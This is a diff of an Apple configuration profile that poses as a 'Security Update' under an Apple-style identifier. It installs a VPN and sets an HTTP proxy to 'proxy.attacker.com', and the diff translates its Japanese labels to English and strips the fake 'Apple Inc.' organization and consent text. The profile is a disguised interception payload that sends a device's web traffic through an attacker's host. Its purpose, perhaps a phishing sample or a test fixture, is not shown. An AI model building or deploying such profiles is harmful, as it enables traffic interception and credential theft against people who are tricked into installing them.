@@ -15,9 +15,9 @@
             <key>PayloadUUID</key>
             <string>00000000-0000-0000-0000-000000000001</string>
             <key>PayloadDisplayName</key>
-            <string>セキュリティVPN</string>
+            <string>VPN</string>
             <key>UserDefinedName</key>
-            <string>セキュリティVPN</string>
+            <string>VPN</string>
             <key>VPNType</key>
             <string>IKEv2</string>
             <key>RemoteAddress</key>
@@ -25,11 +25,7 @@
             <key>AuthenticationMethod</key>
             <string>SharedSecret</string>
             <key>SharedSecret</key>
-            <string>sharedsecret123</string>
-            <key>LocalIdentifier</key>
-            <string>user</string>
-            <key>RemoteIdentifier</key>
-            <string>server</string>
+            <string>secret</string>
         </dict>
         <dict>
             <key>PayloadType</key>
@@ -41,7 +37,7 @@
             <key>PayloadUUID</key>
             <string>00000000-0000-0000-0000-000000000002</string>
             <key>PayloadDisplayName</key>
-            <string>プロキシ設定</string>
+            <string>Proxy</string>
             <key>HTTPProxy</key>
             <string>proxy.attacker.com</string>
             <key>HTTPPort</key>
@@ -53,7 +49,7 @@
         </dict>
     </array>
     <key>PayloadDisplayName</key>
-    <string>セキュリティアップデート</string>
+    <string>Security Update</string>
     <key>PayloadIdentifier</key>
     <string>com.apple.security.update</string>
     <key>PayloadType</key>
@@ -62,14 +58,5 @@
     <string>00000000-0000-0000-0000-000000000003</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
-    <key>PayloadDescription</key>
-    <string>デバイスのセキュリティを向上させるためのアップデート</string>
-    <key>PayloadOrganization</key>
-    <string>Apple Inc.</string>
-    <key>ConsentText</key>
-    <dict>
-        <key>default</key>
-        <string>このプロファイルをインストールすると、デバイスのセキュリティ設定が更新されます。</string>
-    </dict>
 </dict>
 </plist>
